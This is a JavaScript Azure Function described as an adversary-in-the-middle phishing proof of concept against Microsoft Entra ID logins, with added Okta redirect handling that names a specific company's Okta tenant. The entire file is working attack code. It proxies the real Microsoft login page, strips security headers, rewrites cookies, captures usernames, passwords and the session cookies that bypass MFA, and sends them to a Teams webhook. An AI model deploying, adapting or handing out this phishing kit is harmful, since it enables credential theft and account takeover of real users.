/**
 * Azure Function AiTM Phishing PoC for Entra ID accounts.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
  "transfer-encoding",
];

async function replace_response_text(response, upstream, original) {
  return response
    .text()
    .then((text) => text.replace(new RegExp(upstream, "g"), original));
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    const url = new URL(request.url);
    
    // Check if this looks like an Okta session redirect
    // If the user has Okta cookies (idx, sid, JSESSIONID) and is hitting root,
    // redirect them back to Okta dashboard
    const cookies = request.headers.get('cookie') || '';
    const hasOktaSession = cookies.includes('idx=') || 
                           cookies.includes('sid=') || 
                           cookies.includes('JSESSIONID=');
    
    // Also check the referer to see if they came from an Okta page
    const referer = request.headers.get('referer') || '';
    const cameFromOkta = referer.includes('/okta/') || referer.includes('.okta.com');
    
    // Extract Okta domain from referer if available
    let oktaDomain = 'carters.okta.com'; // Default
    const refererMatch = referer.match(/\/okta\/([^\/]+)/);
    if (refererMatch) {
      oktaDomain = refererMatch[1];
    }
    
    // CRITICAL: Check if this is an Okta OAuth/API request that should go to Okta
    // These requests come without the /okta/ prefix because the SDK uses window.location.origin
    const isOktaOAuthPath = url.pathname.startsWith('/oauth2/') || 
                            url.pathname.startsWith('/api/v1/') ||
                            url.pathname.startsWith('/idp/') ||
                            url.pathname.startsWith('/login/') ||
                            url.pathname.startsWith('/enduser/') ||
                            url.pathname.startsWith('/.well-known/');
    
    if (isOktaOAuthPath && (hasOktaSession || cameFromOkta)) {
      // Redirect to the Okta proxy route with full path and query string
      const redirectUrl = `/okta/${oktaDomain}${url.pathname}${url.search}`;
      context.log(`Detected Okta OAuth request, redirecting to ${redirectUrl}`);
      
      return new Response(null, {
        status: 302,
        headers: {
          'Location': redirectUrl,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
        },
      });
    }
    
    // If hitting root "/" with Okta session indicators, redirect to Okta dashboard
    if ((url.pathname === '/' || url.pathname === '') && (hasOktaSession || cameFromOkta)) {
      context.log(`Detected Okta session redirect to root, redirecting to /okta/${oktaDomain}/app/UserHome`);
      
      return new Response(null, {
        status: 302,
        headers: {
          'Location': `/okta/${oktaDomain}/app/UserHome`,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
        },
      });
    }

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        // Convert HTML to plain text for the adaptive card
        const plainText = message
          .replace(/<br>/gi, '\n')
          .replace(/<b>/gi, '**')
          .replace(/<\/b>/gi, '**')
          .replace(/<code>/gi, '`')
          .replace(/<\/code>/gi, '`')
          .replace(/<[^>]*>/g, '');
        
        // Try Power Automate Workflow format (Adaptive Card)
        const adaptiveCardPayload = {
          type: "message",
          attachments: [{
            contentType: "application/vnd.microsoft.card.adaptive",
            content: {
              "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
              type: "AdaptiveCard",
              version: "1.4",
              body: [{
                type: "TextBlock",
                text: plainText,
                wrap: true
              }]
            }
          }]
        };
        
        // Also prepare legacy format as fallback
        const legacyPayload = { text: message };
        
        try {
          // Try Adaptive Card format first (for Power Automate Workflows)
          let response = await fetch(teams_webhook_url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(adaptiveCardPayload),
          });
          
          // If that fails, try legacy format (for O365 Connectors)
          if (!response.ok) {
            response = await fetch(teams_webhook_url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(legacyPayload),
            });
          }
          
          if (response.ok) {
            context.log("Successfully dispatched Teams notification");
          } else {
            context.log(`Failed to dispatch Teams notification: ${response.status} ${response.statusText}`);
          }
        } catch (error) {
          context.log(`Error dispatching Teams notification: ${error.message}`);
        }
      }
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Rewriting to MSONLINE
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url}`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain password from POST body
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key == "login" || key == "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        dispatchMessage(
          "Captured login information: <br>" + JSON.stringify(msg)
        );
      }
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie();

      originalCookies.forEach((originalCookie) => {
        const modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      const cookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("ESTSAUTH=") ||
          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
          cookie.startsWith("SignInStateCookie=")
      );

      if (cookies.length == 3) {
        dispatchMessage(
          "Captured required authentication cookies: <br>" +
            JSON.stringify(cookies)
        );
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
